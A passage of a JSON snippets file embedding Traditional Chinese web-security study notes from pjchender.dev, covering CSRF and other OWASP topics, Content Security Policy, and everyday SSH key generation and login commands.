href=\"#missing-function-level-access-control\" class=\"hash-link\" aria-label=\"Missing Function Level Access Control的直接連結\" title=\"Missing Function Level Access Control的直接連結\">​</a></h3><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-communication\">Insecure Communication<a href=\"#insecure-communication\" class=\"hash-link\" aria-label=\"Insecure Communication的直接連結\" title=\"Insecure Communication的直接連結\">​</a></h2><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-login\">Insecure Login<a href=\"#insecure-login\" class=\"hash-link\" aria-label=\"Insecure Login的直接連結\" title=\"Insecure Login的直接連結\">​</a></h3><p>在把敏感的資料傳送到伺服器前需要先進行加密處理，避免中間人攔截了可以被讀取的封包。除了透過在瀏覽器端自己先加密後再傳送到後端以外，最常見的是透過 HTTPS 將所有從 client 到 server 的內容都進行加密。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"insecure-deserialization\">Insecure Deserialization<a href=\"#insecure-deserialization\" class=\"hash-link\" aria-label=\"Insecure Deserialization的直接連結\" title=\"Insecure Deserialization的直接連結\">​</a></h2><p><strong>序列化（Serialization）</strong>指的是將物件轉換成可被儲存的資料格式的「過程」，序列化之後可以將資料儲存在儲存裝置（記憶體、檔案、資料庫），或者在通訊時傳送。<strong>反序列化（deserialization）</strong>則是用來重新建立該物件。當今最常用來序列化資料的檔案格式是 JSON，而在這之前則是 XML。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"跨站偽造請求cross-site-request-forgery\">跨站偽造請求（Cross-site request forgery）<a href=\"#跨站偽造請求cross-site-request-forgery\" class=\"hash-link\" aria-label=\"跨站偽造請求（Cross-site request forgery）的直接連結\" title=\"跨站偽造請求（Cross-site request forgery）的直接連結\">​</a></h2><p><strong>跨站偽造請求（cross-site request forgery）</strong>也稱為 <strong>one-click attack</strong> 或 <strong>session riding</strong>，通常縮寫為 <strong>CSRF</strong>（有時發音為 sea-surf） 或 <strong>XSRF</strong>，這是一種利用伺服器所信任的網站來發送惡意請求的攻擊；和 cross-site scripting (XSS) 不同，XSS 是透過在網站上輸入惡意程式碼的方式來進行攻擊，通常利用的是使用者對該網站的信任；而 CSRF 則是利用網站對該信用者的信任。</p><p>CSRF 通常有以下特徵：</p><ul><li>該網站需要使用者身份驗證</li><li>利用該網站對使用者 ID 的信任</li><li>欺騙使用者的瀏覽器來傳送 HTTP 請求到目標網站</li><li>包含帶有 side effect 的 HTTP 請求</li></ul><p>當使用者登入特定網站後，攻擊者可能會在使用者不知情的情況下透過瀏覽器送出 HTTP 請求，以此做出無預期的行為。透過 CSRF 攻擊有機會修改受害者的帳號密碼，或是進行消費。</p><p>現在多數的框架都支援去防範 CSRF 的攻擊，舉例來說，Angular 會去讀取 cookie 中的 <code>XSRF-TOKEN</code> 並將他設定在 HTTP header 的 <code>X-XSRF-TOKEN</code>。因為<strong>只有在你的 domain 下才能讀取到該 cookie</strong>，因此後端可以確定這個 HTTP 請求是從 client 送來，而不是攻擊者。</p><p>為了要這樣做，後端伺服器必須在 cookie 中設定一組 token，在每一個從 Angular client 傳送到後端 server 的請求中，都會帶上 <code>X-XSRF-TOKEN</code> 的 HTTP header。後端伺服器可以比對這兩組 token 是否相匹配，以確保伺服器和請求都在同一個 domain 執行。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"client-side\">Client Side<a href=\"#client-side\" class=\"hash-link\" aria-label=\"Client Side的直接連結\" title=\"Client Side的直接連結\">​</a></h2><ul><li>Bypass front-end restriction：直接從瀏覽器端透過修改 HTML 來避開表單驗證。</li><li>Client side filtering：不要把所有資料都吐到 client，而是只吐 client 有權限存取的資料。</li><li>HTML tampering：直接從瀏覽器端透過修改 HTML 來送出不同的表單內容。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"問題解決\">問題解決<a href=\"#問題解決\" class=\"hash-link\" aria-label=\"問題解決的直接連結\" title=\"問題解決的直接連結\">​</a></h2><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-zap-時無法監聽到-localhost\">使用 ZAP 時無法監聽到 localhost<a href=\"#使用-zap-時無法監聽到-localhost\" class=\"hash-link\" aria-label=\"使用 ZAP 時無法監聽到 localhost的直接連結\" title=\"使用 ZAP 時無法監聽到 localhost的直接連結\">​</a></h4><p>解法：透過 ZAP 內「探索您的應用程序」中選擇對應的瀏覽器後按下「啟動瀏覽器」：</p><p><img loading=\"lazy\" src=\"../../../i.imgur.com/bqGCeKl.png\" alt=\"Imgur\" class=\"img_ev3q\"></p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"其他\">其他<a href=\"#其他\" class=\"hash-link\" aria-label=\"其他的直接連結\" title=\"其他的直接連結\">​</a></h2><ul><li><a href=\"https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project\" target=\"_blank\" rel=\"noopener noreferrer\">OWASP Zed Attack Proxy(ZAP)</a>：自動找出網路應用程式可能的安全性漏洞。</li></ul><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"參考\">參考<a href=\"#參考\" class=\"hash-link\" aria-label=\"參考的直接連結\" title=\"參考的直接連結\">​</a></h2><ul><li><a href=\"https://ithelp.ithome.com.tw/articles/10206165\" target=\"_blank\" rel=\"noopener noreferrer\">來玩 webgoat</a> - <a href=\"https://ithelp.ithome.com.tw/users/20107304/ironman/2006\" target=\"_blank\" rel=\"noopener noreferrer\">資安補漏洞，越補越大洞</a> @ iThome</li></ul></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] Content Security Policy pjchender.dev": {
    "prefix": "hinternet [IS] Content Security Policy pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] Content Security Policy</h1></header><blockquote><p><a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP\" target=\"_blank\" rel=\"noopener noreferrer\">Content Security Policy</a> @ MDN</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"說明\">說明<a href=\"#說明\" class=\"hash-link\" aria-label=\"說明的直接連結\" title=\"說明的直接連結\">​</a></h2><p><strong>CSP（Content Security Policy）</strong>主要是用來避免 XSS 攻擊（Cross-site Scripting）和資料側錄的政策，它主要是透過 server 回傳給瀏覽器的 header 中，告訴瀏覽器（user agent）哪些第三方載入的程式碼是可以被執行的，或者可以限制一定要使用 HTTPS 才能與伺服器建立連線等。</p><p>若要啟用 CSP，只需在伺服器回傳的 header 中，加上 <code>Content-Security-Policy</code> 的標頭，並且定義允許載入哪些外部資源。或者也可以透過 HTML 中的 <code>&lt;meta&gt;</code> 標籤來進行宣告。</p><div class=\"theme-admonition theme-admonition-note alert alert--secondary admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M6.3 5.69a.942.942 0 0 1-.28-.7c0-.28.09-.52.28-.7.19-.18.42-.28.7-.28.28 0 .52.09.7.28.18.19.28.42.28.7 0 .28-.09.52-.28.7a1 1 0 0 1-.7.3c-.28 0-.52-.11-.7-.3zM8 7.99c-.02-.25-.11-.48-.31-.69-.2-.19-.42-.3-.69-.31H6c-.27.02-.48.13-.69.31-.2.2-.3.44-.31.69h1v3c.02.27.11.5.31.69.2.2.42.31.69.31h1c.27 0 .48-.11.69-.31.2-.19.3-.42.31-.69H8V7.98v.01zM7 2.3c-3.14 0-5.7 2.54-5.7 5.68 0 3.14 2.56 5.7 5.7 5.7s5.7-2.55 5.7-5.7c0-3.15-2.56-5.69-5.7-5.69v.01zM7 .98c3.86 0 7 3.14 7 7s-3.14 7-7 7-7-3.12-7-7 3.14-7 7-7z\"></path></svg></span>備註</div><div class=\"admonitionContent_S0QG\"><p>如果你看到的是 <code>X-Content-Security-Policy</code>，這是舊版的用法，</p></div></div><p>另外，Content-Security-Policy 的定義中也提供 <code>report-uri https://example.com</code> 的欄位，一旦偵測到有違犯 CSP 的資源，瀏覽器即會發送 POST 請求到指定的 URI，並以 JSON 格式回傳<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#sample_violation_report\" target=\"_blank\" rel=\"noopener noreferrer\">報告</a>。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"範例\">範例<a href=\"#範例\" class=\"hash-link\" aria-label=\"範例的直接連結\" title=\"範例的直接連結\">​</a></h2><p>定義 CSP 的方式可以參考 MDN 上提供的許多<a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP#examples_common_use_cases\" target=\"_blank\" rel=\"noopener noreferrer\">範例</a>。</p></div>",
      "<style>.buttonGroup__atx{display:none;}",
      "pre {background-color: rgb(41,45,62);}</style>"
    ],
    "description": "https://pjchender.dev"
  },
  "hinternet [IS] 關於 SSH pjchender.dev": {
    "prefix": "hinternet [IS] 關於 SSH pjchender.dev",
    "type": "html",
    "isCode": false,
    "body": [
      "<div><h1>[IS] 關於 SSH</h1></header><div class=\"theme-admonition theme-admonition-info alert alert--info admonition_LlT9\"><div class=\"admonitionHeading_tbUL\"><span class=\"admonitionIcon_kALy\"><svg viewBox=\"0 0 14 16\"><path fill-rule=\"evenodd\" d=\"M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z\"></path></svg></span>信息</div><div class=\"admonitionContent_S0QG\"><p><a href=\"https://www.ssh.com/ssh/command/\" target=\"_blank\" rel=\"noopener noreferrer\">SSH Command</a></p></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"tldr\">TL;DR<a href=\"#tldr\" class=\"hash-link\" aria-label=\"TL;DR的直接連結\" title=\"TL;DR的直接連結\">​</a></h3><ul><li><a href=\"https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent\" target=\"_blank\" rel=\"noopener noreferrer\">Generating a new SSH key and adding it to the ssh-agent</a> @ Github</li></ul><p>登入主機</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 產生 SSH 金鑰</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-keygen -o -a </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">100</span><span class=\"token plain\"> -t ed25519</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">chmod</span><span class=\"token plain\"> </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">400</span><span class=\"token plain\"> my-key-pair.pem          </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 改變 private key 的權限</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 登入</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-add wavinfo.rsa                </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># ssh-add &lt;private_key&gt;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">ssh</span><span class=\"token plain\"> wavinfo@192.168.1.4            </span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 預設是  port 22</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token function\" style=\"color:rgb(130, 170, 255)\">ssh</span><span class=\"token plain\"> -i ~/.ssh/id_ed25519 root@192.168.1.4</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><blockquote><p>產生的金鑰會自動被存放在 <code>~/.ssh</code> 資料夾中。</p></blockquote><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"關於-ssh\">關於 SSH<a href=\"#關於-ssh\" class=\"hash-link\" aria-label=\"關於 SSH的直接連結\" title=\"關於 SSH的直接連結\">​</a></h2><p>SSH（遠端登入協定）是一項用來連接伺服器或網路設備，必且透過 CUI/GUI 來操控連線對象的通訊協定，同時也是該連線程式的名稱，必須搭配 TCP 使用，<strong>預設的連接埠為 Port 22</strong>。</p><p>SSH 的特色在於處理作業採用加密機制，因此安全性高，可避免資料被竊取而外洩的情形。</p><p>操作流程是在自己的電腦先<a href=\"https://help.github.com/articles/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent/\" target=\"_blank\" rel=\"noopener noreferrer\">產生 SSH Key 並將它加到 ssh-agent</a> 中，接著將產生的 SSH 產生的 <strong>public key</strong> 新增到 Github 的帳號內，接著就可以透過 SSH 與 Github 連線。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-ssh-登入\">使用 SSH 登入<a href=\"#使用-ssh-登入\" class=\"hash-link\" aria-label=\"使用 SSH 登入的直接連結\" title=\"使用 SSH 登入的直接連結\">​</a></h2><p>SSH 主要用於遠程登錄。假定你要以用戶名 user，登錄遠程主機 host，只要一條簡單命令就可以了：</p><div class=\"language-sh codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-sh codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 先將公鑰和私鑰放到 ~/.ssh 資料夾內</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-add ~/.ssh/wavinfo_rsa</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># 透過 ssh 登入遠程主機</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"># ssh &lt;username&gt;@&lt;remote-host&gt;</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh wavinfo@192.168.1.4</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh -p 2022 wavinfo@192.168.1.4     # 修改成 port 2022</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh -i ~/.ssh/another_key wavinfo@192.168.1.4   # 使用其他 key 登入</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>登入後的流程可參考 <a href=\"http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html\" target=\"_blank\" rel=\"noopener noreferrer\">SSH 原理與運用（一）：遠程登錄</a> @ 阮一峰的網絡日誌。</p><p>「當遠程主機的公鑰被接受以後，它就會被保存在文件 /<code>$HOME/.ssh/known_hosts</code> 之中。下次再連接這台主機，系統就會認出它的公鑰已經保存在本地了，從而跳過警告部分，直接提示輸入密碼。</p><p>每個 SSH 用戶都有自己的 <code>known_hosts</code> 文件，此外系統也有一個這樣的文件，通常是 <code>/etc/ssh/ssh_known_hosts</code>，保存一些對所有用戶都可信賴的遠程主機的公鑰。」 - <a href=\"http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html\" target=\"_blank\" rel=\"noopener noreferrer\">SSH 原理與運用（一）：遠程登錄</a> @ 阮一峰的網絡日誌。</p><h2 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-ssh-金鑰登入\">使用 SSH 金鑰登入<a href=\"#使用-ssh-金鑰登入\" class=\"hash-link\" aria-label=\"使用 SSH 金鑰登入的直接連結\" title=\"使用 SSH 金鑰登入的直接連結\">​</a></h2><p>SSH 支援安全性更高的「公開金鑰認證」。使用時需要先於客戶端建立一對<strong>公開金鑰（Public Key）</strong>和<strong>秘密金鑰（Private Key）</strong>，並且先將公開金鑰儲存於目的端上（例如，Github 或伺服器主機）。連線時除了使用秘密金鑰外，亦可搭配<strong>通行密語（pass-phrase）</strong>更提升安全性。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"檢查自己是否已有金鑰\">檢查自己是否已有金鑰<a href=\"#檢查自己是否已有金鑰\" class=\"hash-link\" aria-label=\"檢查自己是否已有金鑰的直接連結\" title=\"檢查自己是否已有金鑰的直接連結\">​</a></h3><p>在產生 SSH 金鑰時，可以檢查是否已有金鑰。金鑰檔會被存放在 <code>~/.ssh</code> 資料夾中：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">la -al ~/.ssh</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>如果有找到該資料夾且裡面已有檔案，表示已有金鑰，金鑰會分成<strong>公鑰（public）</strong> 和<strong>私鑰（private）</strong>，檔案名稱會像這樣：</p><div class=\"language-yaml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-yaml codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># ed25519 和 rsa 指的是加密方式</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># .pub 表示是公鑰</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">id_ed25519</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">id_ed25519.pub</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">id_rsa</span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">id_rsa.pub</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"產生-ssh-金鑰generate-ssh-key\">產生 SSH 金鑰（Generate SSH Key）<a href=\"#產生-ssh-金鑰generate-ssh-key\" class=\"hash-link\" aria-label=\"產生 SSH 金鑰（Generate SSH Key）的直接連結\" title=\"產生 SSH 金鑰（Generate SSH Key）的直接連結\">​</a></h3><blockquote><p><a href=\"https://docs.github.com/en/free-pro-team@latest/github/authenticating-to-github/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent\" target=\"_blank\" rel=\"noopener noreferrer\">Generating a new SSH key and adding it to the ssh-agent</a> @ Github</p></blockquote><p>透過 <code>ssh-keygen</code> 可以產生 SSH 金鑰：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 產生 ed255519（優） 或 rsa4096（佳）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-keygen -o -a </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">100</span><span class=\"token plain\"> -t ed25519 -C </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;your_email@example.com&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-keygen -t rsa -b </span><span class=\"token number\" style=\"color:rgb(247, 140, 108)\">4096</span><span class=\"token plain\"> -d ~/.ssh/user_ca -C </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;your_email@example.com&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># -t ed25519：指定密鑰演算法，這裡指定為 ed25519</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># -b 4096：密鑰的位數</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># -f ~/.ssh/user_ca：生成密鑰的位置與檔案名稱（預設會放在 ~/.ssh 資料夾中）</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># -C：加上註解</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><p>透過上述的指令將會產生一對密鑰，分別是公鑰（<code>foo.pub</code>）和私鑰（<code>foo</code>）</p><p>如果有需要的話，也可以在為金鑰添加 <strong>passphrase</strong>，類似多一組密碼，每次使用時都要再輸入此 passphrase。</p><h3 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"將-ssh-金鑰加到-ssh-agentssh-add\">將 SSH 金鑰加到 ssh-agent（ssh-add）<a href=\"#將-ssh-金鑰加到-ssh-agentssh-add\" class=\"hash-link\" aria-label=\"將 SSH 金鑰加到 ssh-agent（ssh-add）的直接連結\" title=\"將 SSH 金鑰加到 ssh-agent（ssh-add）的直接連結\">​</a></h3><p>透過 <code>ssh-add</code> 指令可以加 ssh 金鑰加到 ssh-agent，加到 ssh-agent 的好處是不用每次 push 或 pull 時都要打 passphrase：</p><div class=\"language-bash codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" class=\"prism-code language-bash codeBlock_bY9V thin-scrollbar\"><code class=\"codeBlockLines_e6Vv\"><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># 在背景啟動 ssh-agent</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ </span><span class=\"token builtin class-name\" style=\"color:rgb(255, 203, 107)\">eval</span><span class=\"token plain\"> </span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;</span><span class=\"token string variable\" style=\"color:rgb(191, 199, 213)\">$(</span><span class=\"token string variable\" style=\"color:rgb(191, 199, 213)\">ssh-agent -s</span><span class=\"token string variable\" style=\"color:rgb(191, 199, 213)\">)</span><span class=\"token string\" style=\"color:rgb(195, 232, 141)\">&quot;</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\" style=\"display:inline-block\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\"></span><span class=\"token comment\" style=\"color:rgb(105, 112, 152);font-style:italic\"># （或者）每次開啟 terminal 時將 SSH 金鑰加到 ssh-agent</span><span class=\"token plain\"></span><br></span><span class=\"token-line\" style=\"color:#bfc7d5\"><span class=\"token plain\">$ ssh-add id_rsa</span><br></span></code></pre><div class=\"buttonGroup__atx\"><button type=\"button\" aria-label=\"複製代碼至剪貼簿\" title=\"複製\" class=\"clean-btn\"><span class=\"copyButtonIcons_eSgA\" aria-hidden=\"true\"><svg viewBox=\"0 0 24 24\" class=\"copyButtonIcon_y97N\"><path fill=\"currentColor\" d=\"M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z\"></path></svg><svg viewBox=\"0 0 24 24\" class=\"copyButtonSuccessIcon_LjdS\"><path fill=\"currentColor\" d=\"M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z\"></path></svg></span></button></div></div></div><h4 class=\"anchor anchorWithStickyNavbar_LWe7\" id=\"使用-mac-keychain-紀錄\">使用 MAC KeyChain 紀錄<a href=\"#使用-mac-keychain-紀錄\" class=\"hash-link\" aria-label=\"使用 MAC KeyChain 紀錄的直接連結\" title=\"使用 MAC KeyChain 紀錄的直接連結\">​</a></h4><p>如果不想每次開啟 Terminal 都要將 SSH 金鑰加到 ssh-agent ，可以透過 MAC 的 key chain 紀錄：</p><div class=\"language-yaml codeBlockContainer_Ckt0 theme-code-block\" style=\"--prism-color:#bfc7d5;--prism-background-color:#292d3e\"><div class=\"codeBlockContent_biex\"><pre tabindex=\"0\" 